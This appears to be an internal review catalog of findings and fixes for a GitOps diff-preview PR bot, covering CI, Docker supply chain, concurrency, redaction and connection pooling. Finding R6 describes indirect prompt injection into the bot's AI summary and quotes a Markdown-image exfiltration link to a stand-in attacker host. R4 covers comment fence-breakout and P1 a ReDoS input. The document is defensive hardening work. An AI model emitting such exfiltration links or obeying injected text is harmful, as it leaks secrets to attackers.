# Improvement catalog — acme-diff-preview (2026-07-11, post-v2.5.18)

> **STATUS: RESOLVED in v2.5.19** — all code/CI/Docker items below are fixed
> and shipped, EXCEPT E1 (HTTP connection pooling), deferred as the only
> medium-effort change and **shipped in v2.5.20** (`_pooled_urlopen`:
> per-thread keep-alive with urllib fallback, `DIFF_HTTP_POOLING` knob,
> 3 new `/stats` counters, `tests/test_v2520_http_pooling.py`, 10 cases);
> M7 (webhook empty-body
> divergence), left as a documented intentional difference (both endpoints
> still run the HMAC check; the divergence is harmless); and M6
> (session/cookie in _SENSITIVE_KEYS), investigated and reverted — it broke
> two pre-existing regression tests that deliberately keep non-secret config
> visible (see M6 below for the full reasoning). M9 is a documented
> trade-off in the README, not a code change. New tuning knob:
> `DIFF_IGNORE_RESOURCES`. Regression tests: `tests/test_v2519_improvement_batch.py`
> (17 cases). Kept for historical reference like the rest of `bughunt/`.
>
> Original analysis below, unedited. Three review passes after the v2.5.18 scale hardening, each with a
> different lens: (M) diff engine + CI/CD + container/chart hardening +
> leftovers from the full-file pass; (E) hostile-external-world and data
> shapes; (F) operator experience and lifecycle. None of these is in the
> severity class of the redaction leaks (v2.5.16/17) or the scale findings
> (v2.5.18) — the codebase is in strong shape — but several carry real
> operational value. Severities: MED > LOW-MED > LOW > INFO.

## Pass M — engine, CI/CD, container, leftovers

### M1 (MED, operational) — github-release tag race in release.yml
The workflow triggers only on `push: branches: [main]`. Our release flow
pushes the v* tag 1-2 minutes AFTER the merge, so the `github-release`
backfill job runs before the tag exists and does nothing. Bit us on
v2.5.16, v2.5.17 AND v2.5.18 — three manual job re-runs in a row.
Fix: add `tags: ['v*']` to the trigger with per-job `if:` conditions
(`release` job only for refs/heads/main; `github-release` for both). Tag
push then fires the release immediately; the main-push backfill remains.

### M2 (MED, supply chain) — unverified CLI downloads in the Dockerfile
The Python base image is digest-pinned, but the `argocd` and `helm`
binaries are curl-downloaded with NO checksum verification. A compromised
get.helm.sh or GitHub release asset would ship silently into the image.
Fix: pin the sha256 of both artifacts next to their version ARGs and
verify with `sha256sum -c` before install.

### M3 (LOW-MED, concurrency hygiene) — `_helm_chart_pull_ts` lock gaps
Three sites touch this dict without `_helm_cache_lock` while the sibling
`_helm_chart_cache` operations right next to them are locked:
`_invalidate_for_republish` (webhook thread) pops it unlocked;
`_ensure_chart`'s success path writes it one line OUTSIDE the `with`
block; two read sites read it unlocked. GIL keeps single-key dict ops
atomic, so worst case is one redundant re-pull when a JFrog republish
races an in-flight pull of the same chart:version — but it is the one
shared dict in the file not guarded like the others. Fix: three one-line
moves into the existing lock.

### M4 (LOW-MED, shutdown) — SIGTERM drain waits for the whole queue
`process_batch` breaks its as_completed loop on `_shutdown`, but the
`with ThreadPoolExecutor` exit then calls shutdown(wait=True), blocking on
every QUEUED future — on a mass PR the pod exceeds
terminationGracePeriodSeconds and gets SIGKILLed. The partial-results
guard keeps correctness (no comment is posted), only the "graceful" label
is wrong. Fix: call `ex.shutdown(wait=False, cancel_futures=True)` before
the break; the with-exit's second shutdown is then a no-op.

### M5 (LOW, resilience) — Retry-After HTTP-date form ignored
`http()` honors only the delta-seconds form of Retry-After; the HTTP-date
form falls through to generic exponential backoff (allowed, suboptimal
under a real Bitbucket rate-limit window). Fix:
`email.utils.parsedate_to_datetime` fallback.

### M6 (LOW, redaction policy) — `session`/`cookie` not in _SENSITIVE_KEYS

**INVESTIGATED, NOT APPLIED (v2.5.19).** A `sessionCookie:`/`sessionToken:`-
style key in a ConfigMap or CRD is not masked by key name ("token" catches
sessionToken, but a bare `session:`/`cookie:` key is not caught). Tried
adding `session` and `cookie` as bare substrings; reverted immediately —
it collided with two pre-existing regression tests that deliberately keep
non-secret config visible: `appspace_cookieDomain` (a hostname value) and
`SESSION_COOKIE` as an env-var name (intentionally non-secret value in the
test), the second guarded by a test literally named
`test_redact_non_sensitive_name_still_kept`. A compound key like
`authCookie` is already caught via "auth". The residual gap (a truly bare
`session`/`cookie` key with no other secret-word nearby) is narrower than
originally assumed and not worth the false-positive risk against an
already-tested design decision. Left as-is.

### M7 (LOW, consistency) — webhook empty-body divergence
`/diff-preview/webhook` (Bitbucket) rejects length <= 0 with 413;
`/jfrog-webhook` explicitly allows length == 0. Both block the negative
length (v2.5.2 C1). Decide once: allow 0 on both (harmless — HMAC check
still runs) or document the divergence where both live.

### M8 (LOW, observability) — /stats blind to the v2.5.18 machinery
No counters for: comments truncated, AI prompts capped, per-diff retries
performed, subtask futures cancelled, chart-pull timeouts. Adding them
makes the scale hardening measurable in prod (are these paths firing?
how often?) for the cost of a few `_diff_stats[...] += 1` lines.

### M9 (INFO, documented trade-off — do NOT implement) — retries sleep in-worker
`argocd_diff`'s backoff `time.sleep(delay)` runs inside the DIFF_WORKERS
slot: during a transient registry blip on a mass PR, up to 16 workers
spend most wall time sleeping (cumulative backoff can reach ~75s/app).
A requeue-based retry would raise throughput but is a significant
process_batch redesign; the current design is simple and correct.
Document in the README as a known trade-off, revisit only if blip-storms
become common.

## Pass E — hostile external world, data shapes

### E1 (LOW-MED, perf at scale) — no HTTP connection reuse
`http()` uses `urllib.request.urlopen` per call: a fresh TCP+TLS handshake
for every request. A mass-PR pass makes ~2-3K Bitbucket calls — each
paying ~100-300ms of pure handshake overhead and hammering BB's connection
accept path (parallel across the 30-slot semaphore, but still). Stdlib-only
fix shape: per-thread `http.client.HTTPSConnection` kept in
`threading.local()` with transparent reconnect-on-error; urllib fallback
on anything unexpected. Medium effort; the biggest single latency win
available for mass PRs after v2.5.18.

### E2 (LOW, operator agility) — DIFF_IGNORE_RESOURCE_PATTERNS hardcoded
The noise-resource list is a source constant with one entry
(micro-versions-info). Silencing the NEXT noisy auto-generated resource
requires a full release. Fix: merge in an env var
(e.g. `DIFF_IGNORE_RESOURCES`, comma-separated substrings) so operators
can act immediately, keeping the built-in entry as the default. Also the
cheap partial answer to volatile chart output (rand/now-style fields)
until a chart actually exhibits it.

### E3 (LOW, display) — invisible line-ending-only diffs
A PR that flips CRLF<->LF in a value file yields rendered diffs where
removed/added lines LOOK identical (the \r is invisible), which reads as
a broken diff. Fix shape: when a -/+ pair differs only by trailing \r,
annotate it ("(line endings differ)") in the display path.

### E4 (INFO — verified healthy this pass)
`_split_yaml_docs` is safe against `---` inside block scalars (content is
always indented; the split regex requires column 0). The List-wrapper
dedent cannot split on nested sequences. Fetched files decode with
errors="replace" (invalid UTF-8 degrades, never crashes). BOM is helm's
problem and helm handles it. `_diff_resources` is clean.

## Pass F — operator experience, lifecycle

### F1 (LOW-MED, high operator value) — no runtime version visibility
Nothing in the pod tells you what version is actually running: no
__version__, no startup banner, nothing in /stats. Our own release
discipline ("always verify the live pod image") is a manual kubectl
exercise because of this. Fix: inject the version at image build
(docker.yml already knows the tag: ARG -> ENV), log a startup banner with
version + effective config (workers, caps, timeouts — catches env drift
at a glance), and expose `version` in /stats. Post-deploy verification
becomes one curl.

### F2 (LOW, first-run experience) — required-env failure is a raw KeyError
`os.environ["BB_USER"]` at import time fail-fasts correctly but greets a
misconfigured deployment with a bare traceback for ONE var at a time.
Fix: validate all required vars up front and exit with a single clear
message listing everything missing.

### F3 (INFO — verified healthy this pass)
log() already emits GCP-native structured JSON with severity + labels.
ArgoCD auth is JWT via API ("no password on CLI"); helm login uses
--password-stdin; dev_hard_refresh keeps ARGOCD_PASS off the process
list. Startup fails loudly (by design) when config is unusable.

## Suggested batching
A single v2.5.19 can carry all of it: M3-M8 + E2-E3 + F1-F2 in code with
regression tests, M1-M2 in CI/Docker, M9 to the README, E1 as its own
follow-up PR if preferred (it is the only medium-effort item).

## Appendix — community-research round (R1, R2, R4, R6), all applied in v2.5.19

Cross-checked against public issue trackers, CVE databases and design docs
for analogous GitOps diff/PR-bot tooling (Argo CD, argocd-diff-preview,
helm-diff, Helm, Atlantis). Two additional items from that research (R3
malicious-chart sandboxing, R5 TOCTOU on force-push) were reviewed and
judged already adequately covered by this codebase's existing design
(charts are pulled from an internal, access-controlled JFrog registry, not
arbitrary PR-supplied sources; SHA dedup already binds every diff/comment
to the exact pr_sha) — not added here to avoid solving a problem this
service does not actually have.

### R1 (HIGH candidate, concurrency) — shared helm OCI cache under ThreadPoolExecutor
Helm 3.x has no file locking around its shared OCI blob store/index (helm
#8059, #30983 — fixed only in Helm 4.1.0). Concurrent pulls of DIFFERENT
chart:versions (WARM_WORKERS pre-warm + the per-diff pull pair) shared one
cache; the per-key pull lock only serializes the SAME chart:version. Fix:
each `helm pull` now runs with a private `HELM_REGISTRY_CONFIG`/
`HELM_CACHE_HOME`/`HELM_CONFIG_HOME`/`HELM_DATA_HOME` under `HELM_CACHE_DIR`,
cleaned up in a `finally`; `_prune_helm_cache` reaps any orphan left by a
pod killed mid-pull.

### R2 (HIGH, secret leak) — helm YAML errors reached the comment unredacted
`helm template`'s error message echoes the offending source line verbatim
(the same class as Argo CD CVE-2025-23216, secrets shown in error messages
and diff views). A value-file parse failure could leak whatever was on
that line straight into `_indeterminate`'s `.error`, which reaches the PR
comment and build status. Fix: `_redact_error_detail()` masks the value
after any sensitive-looking `key:`/`key=` token before storage, keeping
the key name for diagnosis.

### R4 (MED, comment injection) — no fence-breakout protection
A rendered manifest value containing ` ``` ` closes the bot's own
` ```diff ` fence early, letting the rest of that value render as live
Markdown — enough to inject a fake "Status: SUCCESS" line or hidden
content a reviewer reads as the bot's own words. Fix: `_fence_safe()`
inserts a zero-width space between backticks (breaks the fence token,
reads identically to a human) in every body placed inside a fence.

### R6 (MED, AI prompt injection) — AI summary embedded with no output sanitization
The AI summary is model output built from untrusted rendered values,
making it an indirect-prompt-injection sink. The documented "Markdown
image exfiltration" pattern (a model coaxed into emitting
`![x](https://attacker/?d=<secret>)`) is a zero-click data-leak channel:
the renderer fetches the URL on render. Fix: `_sanitize_ai_summary()`
strips Markdown images (keeping alt text), raw HTML tags, HTML comments,
and neutralizes fences from the model's output before it is embedded —
never from the deterministic, code-built head line.


## Pass P — post-v2.5.20 five-pass adversarial review (2026-07-11)

Focus: the v2.5.20 connection-pooling code (hours old) plus angles earlier
passes did not cover (ReDoS, FD lifecycle, proxy semantics). Labels P1..P5
to avoid colliding with the E/F/M/R prefixes above.

### P1 (HIGH, DoS — FIXED v2.5.21) — ReDoS worker starvation in _redact_error_detail
`helm template` errors echo the offending values-file content, and
`_redact_error_detail` regexed the FULL untruncated stderr before the
caller's `[:400]`. The `[A-Za-z0-9_.\-]*` prefix backtracks quadratically
on a dashed near-miss run (`aaa-aaa-...`) an attacker can put in a values
file. Measured 20K->8s, 40K->33s, 80K->132s; a ~200KB blob pinned a worker
thread ~15 min — an unauthenticated-input DoS gated only by opening a PR.
Fix: bound the input to `_REDACT_DETAIL_MAX_CHARS` (4000) BEFORE the regex.

### P2 (LOW-MED, FD leak — FIXED v2.5.21) — pooled sockets leaked on ephemeral pools
Per-diff/per-PR `ThreadPoolExecutor`s spawn workers that each stash an
`HTTPSConnection` in `threading.local()`; when the pool is torn down the
threads die with sockets still open (GC-timed close only). Fix:
`_close_pooled_connections()` run in `run_diff`'s `finally`, releasing each
worker's sockets before it idles. Reuse still happens within a single diff.

### P3 (LOW, correctness — FIXED v2.5.21) — pool ignored HTTPS_PROXY
Raw `http.client` does not honor proxy env vars; `urlopen` does. Proven
with a local listener (urlopen sent CONNECT, the pool went direct). Latent
today (no egress proxy in the pods) but breaks the drop-in guarantee. Fix:
if `urllib.request.getproxies()` is non-empty, defer to `urlopen`.

### P4 (INFO — FIXED v2.5.21, folded into P2) — two sockets per worker per host
Keying by `(host, timeout)` held two live Bitbucket sockets per worker
(http()'s 60s vs the raw fetch's 20s). Fix: key by host only, set the
timeout per-request on the connection.

### P5 (INFO — documented, no code change) — /stats readable cluster-wide
The health/stats server binds all interfaces and the chart ships no
NetworkPolicy, so any pod in the shared devops cluster can read
`/diff-preview/stats` (counters + running version). Webhooks are
HMAC-protected, so this is metadata exposure, not a control surface. A
NetworkPolicy would harden it but must preserve the webhook ingress path;
tracked here as a candidate, deliberately not changed unilaterally.
